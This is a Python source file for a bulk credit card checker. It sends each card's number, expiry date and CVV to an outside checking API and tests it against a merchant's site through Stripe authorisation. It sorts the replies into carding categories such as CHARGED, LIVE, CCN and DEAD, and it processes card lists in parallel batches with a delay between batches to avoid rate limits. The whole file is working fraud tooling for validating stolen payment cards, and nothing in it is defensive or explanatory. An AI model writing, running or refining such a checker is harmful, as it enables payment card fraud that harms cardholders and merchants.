import asyncio
import aiohttp
import json

API_URL = "https://newrp.vercel.app/check"
SITE = "https://epicalarc.com"

async def check_ast(cc, mm, yy, cvv):
    """Check card using Auto Stripe Auth API"""
    try:
        card = f"{cc}|{mm}|{yy}|{cvv}"
        url = f"{API_URL}?cc={card}&site={SITE}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as response:
                text = await response.text()
                
                try:
                    data = json.loads(text)
                except:
                    return {'status': 'ERROR', 'response': text[:100] if text else 'No response'}
                
                success = data.get('success', False)
                message = data.get('message', '')
                
                try:
                    msg_data = json.loads(message) if isinstance(message, str) else message
                except:
                    msg_data = {'error': {'message': message}}
                
                if isinstance(msg_data, dict):
                    if msg_data.get('success') == True:
                        return {'status': 'CHARGED', 'response': 'Payment Successful'}
                    
                    error_obj = msg_data.get('data', {}).get('error', {})
                    if not error_obj:
                        error_obj = msg_data.get('error', {})
                    
                    error_msg = error_obj.get('message', '') if isinstance(error_obj, dict) else str(error_obj)
                    decline_code = error_obj.get('decline_code', '') if isinstance(error_obj, dict) else ''
                else:
                    error_msg = str(msg_data)
                    decline_code = ''
                
                if not error_msg:
                    error_msg = message[:100] if message else 'Unknown'
                
                error_lower = error_msg.lower()
                
                if any(x in error_lower for x in ['insufficient', 'cvv', 'cvc', 'security code', 'incorrect_cvc']):
                    return {'status': 'CCN', 'response': error_msg}
                elif any(x in error_lower for x in ['3d secure', 'requires_action', 'authentication']):
                    return {'status': 'LIVE', 'response': '3D Secure Required'}
                elif any(x in error_lower for x in ['success', 'approved', 'charged']):
                    return {'status': 'CHARGED', 'response': error_msg}
                else:
                    resp = error_msg
                    if decline_code:
                        resp += f" ({decline_code})"
                    return {'status': 'DEAD', 'response': resp}
                    
    except asyncio.TimeoutError:
        return {'status': 'ERROR', 'response': 'Request timeout (60s)'}
    except Exception as e:
        return {'status': 'ERROR', 'response': str(e)[:100]}

async def mass_check_ast(cards: list, batch_size: int = 5, delay: float = 1.0):
    """Mass check cards with 5 parallel batches and 1 sec delay"""
    results = []
    
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i + batch_size]
        
        tasks = []
        for card_data in batch:
            parts = card_data.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                tasks.append(check_ast(cc, mm, yy, cvv))
        
        if tasks:
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(batch_results):
                card = batch[j] if j < len(batch) else "Unknown"
                if isinstance(result, Exception):
                    results.append({'card': card, 'status': 'ERROR', 'response': str(result)[:50]})
                else:
                    results.append({'card': card, **result})
        
        if i + batch_size < len(cards):
            await asyncio.sleep(delay)
    
    return results
